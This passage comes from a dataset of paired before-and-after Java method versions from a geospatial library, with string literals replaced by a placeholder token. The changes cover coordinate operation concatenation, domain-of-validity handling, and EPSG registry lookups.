      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy,setDomain);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation) && (PositionalAccuracyConstant.getLinearAccuracy(op) != 0)) {
      if (coordinateOperationAccuracy == null) {
        coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
    if (setDomain) {
      final Extent domain=op.getDomainOfValidity();
      if (domain != null) {
        if (domainOfValidity == null) {
          domainOfValidity=domain;
        }
 else         if (!domain.equals(domainOfValidity)) {
          domainOfValidity=null;
          setDomain=false;
        }
      }
    }
  }
}"
91859,"/** 
 * Prints the name and authority code (if any) of the given object.
 */
private void printNameAndIdentifier(final IdentifiedObject object){
  outHeader.append(object.getName().getCode());
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  outHeader.nextLine();
}","/** 
 * Prints the name and authority code (if any) of the given object.
 * @param object      the object for which to print name and identifier.
 * @param idRequired  {@code true} for printing the name only if an identifier is present.
 * @return whether this method has printed something.
 */
private boolean printNameAndIdentifier(final IdentifiedObject object,final boolean idRequired){
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (idRequired && identifier == null) {
    return false;
  }
  outHeader.append(object.getName().getCode());
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  if (!idRequired) {
    outHeader.nextLine();
  }
  return true;
}"
91860,"/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  operation=CRS.findOperation(fetchCRS(Option.SOURCE_CRS),fetchCRS(Option.TARGET_CRS),null);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS());
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS());
  printHeader(Vocabulary.Keys.Methods);
  printOperationMethods(operation,false);
  outHeader.nextLine();
  if (options.containsKey(Option.VERBOSE)) {
    final WKTFormat f=new WKTFormat(locale,timezone);
    f.setConvention(options.containsKey(Option.DEBUG) ? Convention.INTERNAL : convention);
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    final CharSequence[] lines=CharSequences.splitOnEOL(f.format(operation.getMathTransform()));
    for (int i=0; i < lines.length; i++) {
      if (i == 0) {
        printHeader(Vocabulary.Keys.Details);
      }
 else {
        printCommentLinePrefix();
        outHeader.nextColumn();
      }
      outHeader.append(lines[i]);
      outHeader.nextLine();
    }
  }
  double accuracy=CRS.getLinearAccuracy(operation);
  if (accuracy >= 0) {
    if (accuracy == 0) {
      accuracy=Formulas.LINEAR_TOLERANCE;
    }
    printHeader(Vocabulary.Keys.Accuracy);
    if (colors) {
      outHeader.append(X364.FOREGROUND_YELLOW.sequence());
    }
    outHeader.append(Double.toString(accuracy));
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
    outHeader.append(""String_Node_Str"");
    outHeader.nextLine();
  }
  outHeader.flush();
  outHeader=null;
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    computeDomainOfValidity();
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    if (useStandardInput) {
      final LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding));
      try {
        transform(in,""String_Node_Str"");
      }
  finally {
        in.close();
      }
    }
 else {
      for (      final String file : files) {
        final LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding));
        try {
          transform(in,file);
        }
  finally {
          in.close();
        }
      }
    }
  }
  return 0;
}","/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  final CoordinateReferenceSystem sourceCRS=fetchCRS(Option.SOURCE_CRS);
  final CoordinateReferenceSystem targetCRS=fetchCRS(Option.TARGET_CRS);
  GeographicBoundingBox areaOfInterest=null;
  List<double[]> points=Collections.emptyList();
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    if (useStandardInput) {
      LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding));
      try {
        points=readCoordinates(in,""String_Node_Str"");
      }
  finally {
        in.close();
      }
    }
 else {
      for (      final String file : files) {
        LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding));
        try {
          points=readCoordinates(in,file);
        }
  finally {
          in.close();
        }
      }
    }
    try {
      final GeographicCRS domainOfValidityCRS=ReferencingUtilities.toNormalizedGeographicCRS(sourceCRS);
      if (domainOfValidityCRS != null) {
        toDomainOfValidity=CRS.findOperation(sourceCRS,domainOfValidityCRS,null).getMathTransform();
        areaOfInterest=computeAreaOfInterest(points);
      }
    }
 catch (    FactoryException e) {
      warning(e);
    }
  }
  operation=CRS.findOperation(sourceCRS,targetCRS,areaOfInterest);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS(),false);
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS(),false);
  printHeader(Vocabulary.Keys.Operations);
  printOperations(operation,false);
  outHeader.nextLine();
  printDomainOfValidity(operation.getDomainOfValidity());
  printAccuracy(CRS.getLinearAccuracy(operation));
  if (options.containsKey(Option.VERBOSE)) {
    printDetails();
  }
  outHeader.flush();
  outHeader=null;
  if (!points.isEmpty()) {
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    transform(points);
    if (errorMessage != null) {
      error(errorMessage,errorCause);
    }
  }
  return 0;
}"
91861,"/** 
 * Transforms the coordinates read from the given stream. This method ignores empty and comment lines.
 * @param in        the stream from where to read coordinates.
 * @param filename  the filename, for error reporting only.
 * @return the errors that occurred during transformation.
 */
private void transform(final LineNumberReader in,final String filename) throws IOException {
  final int dimension=operation.getSourceCRS().getCoordinateSystem().getDimension();
  final MathTransform mt=operation.getMathTransform();
  final double[] result=new double[mt.getTargetDimensions()];
  final double[] domainCoordinate;
  final DirectPositionView positionInDomain;
  if (toDomainOfValidityCRS != null) {
    domainCoordinate=new double[toDomainOfValidityCRS.getTargetDimensions()];
    positionInDomain=new DirectPositionView(domainCoordinate,0,domainCoordinate.length);
  }
 else {
    domainCoordinate=null;
    positionInDomain=null;
  }
  try {
    String line;
    while ((line=in.readLine()) != null) {
      final int start=CharSequences.skipLeadingWhitespaces(line,0,line.length());
      if (start < line.length() && line.charAt(start) != '#') {
        final double[] coordinates=CharSequences.parseDoubles(line,',');
        if (coordinates.length != dimension) {
          throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimensionForCRS_3,operation.getSourceCRS().getName().getCode(),dimension,coordinates.length));
        }
        mt.transform(coordinates,0,result,0,1);
        for (int i=0; i < result.length; i++) {
          if (i != 0) {
            out.print(',');
          }
          final double value=result[i];
          final String s;
          if (Math.abs(value) >= thresholdForScientificNotation[i]) {
            s=Double.toString(value);
          }
 else {
            coordinateFormat.setMinimumFractionDigits(numFractionDigits[i]);
            coordinateFormat.setMaximumFractionDigits(numFractionDigits[i]);
            s=coordinateFormat.format(value);
          }
          out.print(CharSequences.spaces(ordinateWidth - s.length()));
          out.print(s);
        }
        if (domainCoordinate != null) {
          boolean inside;
          try {
            toDomainOfValidityCRS.transform(coordinates,0,domainCoordinate,0,1);
            inside=domainOfValidity.contains(positionInDomain);
          }
 catch (          TransformException e) {
            inside=false;
            warning(e);
          }
          if (!inside) {
            out.print(""String_Node_Str"");
            printQuotedText(Errors.getResources(locale).getString(Errors.Keys.OutsideDomainOfValidity),0,X364.FOREGROUND_RED);
          }
        }
        out.println();
      }
    }
  }
 catch (  Exception e) {
    error(Errors.format(Errors.Keys.ErrorInFileAtLine_2,filename,in.getLineNumber()),e);
  }
}","/** 
 * Transforms the given coordinates.
 */
private void transform(final List<double[]> points) throws TransformException {
  final int dimension=operation.getSourceCRS().getCoordinateSystem().getDimension();
  final MathTransform mt=operation.getMathTransform();
  final double[] result=new double[mt.getTargetDimensions()];
  final double[] domainCoordinate;
  final DirectPositionView positionInDomain;
  final ImmutableEnvelope domainOfValidity;
  final GeographicBoundingBox bbox;
  if (toDomainOfValidity != null && (bbox=CRS.getGeographicBoundingBox(operation)) != null) {
    domainOfValidity=new ImmutableEnvelope(bbox);
    domainCoordinate=new double[toDomainOfValidity.getTargetDimensions()];
    positionInDomain=new DirectPositionView(domainCoordinate,0,domainCoordinate.length);
  }
 else {
    domainOfValidity=null;
    domainCoordinate=null;
    positionInDomain=null;
  }
  for (  final double[] coordinates : points) {
    if (coordinates.length != dimension) {
      throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimensionForCRS_3,operation.getSourceCRS().getName().getCode(),dimension,coordinates.length));
    }
    mt.transform(coordinates,0,result,0,1);
    for (int i=0; i < result.length; i++) {
      if (i != 0) {
        out.print(',');
      }
      final double value=result[i];
      final String s;
      if (Math.abs(value) >= thresholdForScientificNotation[i]) {
        s=Double.toString(value);
      }
 else {
        coordinateFormat.setMinimumFractionDigits(numFractionDigits[i]);
        coordinateFormat.setMaximumFractionDigits(numFractionDigits[i]);
        s=coordinateFormat.format(value);
      }
      out.print(CharSequences.spaces(ordinateWidth - s.length()));
      out.print(s);
    }
    if (domainOfValidity != null) {
      boolean inside;
      try {
        toDomainOfValidity.transform(coordinates,0,domainCoordinate,0,1);
        inside=domainOfValidity.contains(positionInDomain);
      }
 catch (      TransformException e) {
        inside=false;
        warning(e);
      }
      if (!inside) {
        out.print(""String_Node_Str"");
        printQuotedText(Errors.getResources(locale).getString(Errors.Keys.OutsideDomainOfValidity),0,X364.FOREGROUND_RED);
      }
    }
    out.println();
  }
}"
91862,"/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=JDK8.putIfAbsent(objects,code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (JDK8.remove(objects,code,null)) {
        codes=null;
      }
    }
  }
  return object;
}","/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(getLocale()).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=JDK8.putIfAbsent(objects,code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (JDK8.remove(objects,code,null)) {
        codes=null;
      }
    }
  }
  return object;
}"
91863,"/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      final ResultSet result=executeQuery(key,sql,pair);
      try {
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
  finally {
        result.close();
      }
    }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}","/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first. Deprecated operations are not included in the set; if a deprecated operation is really wanted, it can be fetched by an explicit call to   {@link #createCoordinateOperation(String)}.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      final ResultSet result=executeQuery(key,sql,pair);
      try {
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
  finally {
        result.close();
      }
    }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}"
91864,"/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException exception) {
    log(exception);
    return null;
  }
catch (  MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      try {
        candidate=it.next();
      }
 catch (      BackingStoreException exception) {
        throw exception.unwrapOrRethrow(FactoryException.class);
      }
      if (inverse)       try {
        candidate=inverse(candidate);
      }
 catch (      NoninvertibleTransformException exception) {
        Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
        continue;
      }
    }
 catch (    MissingFactoryResourceException e) {
      log(e);
      continue;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}","/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException exception) {
    log(exception);
    return null;
  }
catch (  MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      candidate=it.next();
    }
 catch (    BackingStoreException exception) {
      FactoryException cause=exception.unwrapOrRethrow(FactoryException.class);
      if (cause instanceof MissingFactoryResourceException) {
        log(cause);
        continue;
      }
      throw cause;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          if (inverse)           try {
            candidate=inverse(candidate);
          }
 catch (          NoninvertibleTransformException exception) {
            Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
            continue;
          }
catch (          MissingFactoryResourceException e) {
            log(e);
            continue;
          }
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}"
91865,"/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<CoordinateOperation>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),coordinateOperationAccuracy == null);
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new CoordinateOperation[flattened.size()]));
}","/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<CoordinateOperation>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),(coordinateOperationAccuracy == null),(domainOfValidity == null));
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new CoordinateOperation[flattened.size()]));
}"
91866,"/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation)) {
      if (coordinateOperationAccuracy == null) {
        setAccuracy=(PositionalAccuracyConstant.getLinearAccuracy(op) > 0);
        if (setAccuracy) {
          coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
        }
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
  }
}","/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @param setDomain   {@code true} for setting the {@link #domainOfValidity} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
